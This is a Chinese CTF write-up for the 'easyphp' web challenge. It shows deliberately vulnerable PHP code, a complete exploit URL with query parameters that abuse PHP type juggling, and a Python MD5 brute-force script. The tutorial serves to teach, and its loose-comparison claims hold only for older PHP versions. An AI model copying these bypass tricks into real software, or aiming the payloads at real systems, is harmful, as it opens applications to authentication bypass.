【攻防世界】 Web新手题

题目描述：easyphp

题目来源：江苏工匠杯

题解过程：

```php
<?php
// 显示当前文件的源代码
highlight_file(__FILE__);

// 初始化两个标志变量，用于记录是否通过前后两个阶段的验证
$key1 = 0;
$key2 = 0;

// 从URL的GET参数中获取a和b的值
$a = $_GET['a'];
$b = $_GET['b'];

// 第一阶段验证：检查a和b参数
if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    // 如果a参数存在，转换为整数后大于600万，且字符串长度不超过3个字符
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        // 如果b参数存在，且b的MD5哈希值的最后6个字符等于'8b184b'
        $key1 = 1;  // 通过第一阶段验证，设置key1为1
        }else{
            die("Emmm...再想想");  // b参数验证失败，退出并显示提示
        }
    }else{
    die("Emmm...");  // a参数验证失败，退出并显示提示
}

// 从URL的GET参数c中获取JSON数据并转换为PHP数组
$c=(array)json_decode(@$_GET['c']);

// 第二阶段验证：检查c参数的数据结构
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    // 如果c是数组，且c中的m元素不是数字，但比较时大于2022
    
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        // 如果c中的n元素是数组，且恰好有2个元素，且第一个元素也是数组
        
        $d = array_search("DGGJ", $c["n"]);  // 在n数组中搜索"DGGJ"值
        $d === false?die("no..."):NULL;      // 如果没找到DGGJ，退出程序
        
        // 遍历n数组的每个元素
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;  // 如果任何元素严格等于"DGGJ"，退出程序
        }
        $key2 = 1;  // 通过第二阶段验证，设置key2为1
    }else{
        die("no hack");  // n数组结构不符合要求，退出
    }
}else{
    die("no");  // c参数验证失败，退出
}

// 最终验证：如果两个阶段都通过
if($key1 && $key2){
    include "Hgfks.php";        // 包含存储flag的文件
    echo "You're right"."\n";   // 显示成功信息
    echo $flag;                 // 输出flag
}

?>

```

1、看到这种题，不要慌，首先F12打开终端、查看源码等等，看看是否有其它的信息

2、开始代码审计，理解整个php代码的运行流程，以及如何构造参数。（每行代码已给出解释——见上方图片）

完整构造：

```
http://61.147.171.35:64025/?a=6e9&b=53724&c={"m":"2025a","n":[[1,2],0]}
```

3、这里牵扯到一些性质和方法，也是CTF经常会出现的题。

​	（1）JSON数据结构构造

​	（2）MD5哈希碰撞：（可自行利用语言编写脚本或使用专门哈希碰撞工具）

​			暴力破解找到MD5最后六位为特定值的输入（最常见）

python：（每行已给注释）

```python
import hashlib  # 导入哈希库，用于计算MD5等哈希值


def simple_brute_force():  # 定义一个名为simple_brute_force的函数，用于暴力破解
    target = "8b184b"  # 设置目标字符串，即MD5哈希值的最后6位需要匹配的内容

    for i in range(100000000):  # 循环1亿次，i从0到99999999
        test_str = str(i)  # 将当前数字i转换为字符串，因为MD5函数需要字符串输入

        md5_hash = hashlib.md5(test_str.encode()).hexdigest()  # 计算test_str的MD5哈希值并转换为16进制字符串

        if md5_hash[-6:] == target:  # 检查MD5哈希值的最后6个字符是否等于目标值"8b184b"
            print(f"✅ 找到解: {test_str}")  # 如果找到匹配，打印成功的提示信息和找到的字符串
            print(f"完整MD5: {md5_hash}")  # 打印完整的MD5哈希值，用于验证
            return test_str  # 返回找到的字符串并结束函数执行

        # 每100万次显示进度
        if i % 1000000 == 0:  # 检查当前循环次数是否是100万的倍数（0, 1000000, 2000000...）
            print(f"已尝试: {i} 次...")  # 打印当前已尝试的次数，让用户了解进度

    print("❌ 在数字范围内未找到解")  # 如果循环结束都没有找到匹配的值，打印失败信息
    return None  # 返回None表示没有找到解


# 运行
print("开始暴力破解...")
result = simple_brute_force()  # 调用simple_brute_force函数执行暴力破解，并将结果保存到result变量
if result:  # 检查result是否有值（不是None、False、0等假值）
    print(f"🎉 成功！输入这个值即可: {result}")  # 如果找到了解，打印最终的成功信息和找到的值
```

​	（3）PHP类型转换

​			只有以非数字开头的字符串才会被转换为0

​	（4）PHP松散比较

​			0 == "DGGJ"        // true - 非数字字符串转为0 

​			0 == "ABC"         // true 

​			0 == "任何非数字"    // true 

​			1 == "DGGJ"        // false

​	（5）PHP错误控制符@

​			@$["m"]——即使@$["m"]不存在也不报错

4、总结

​	写这种CTF题时，我认为最重要的一点是：”一定要代码审计，一点要看懂整个代码的运行流程。不然无从下手。要学会利用工具以及自行编写脚本的能力，市面上这么多语言，至少精通一名语言，这里推荐python，上手快 ，效率高，运行快！
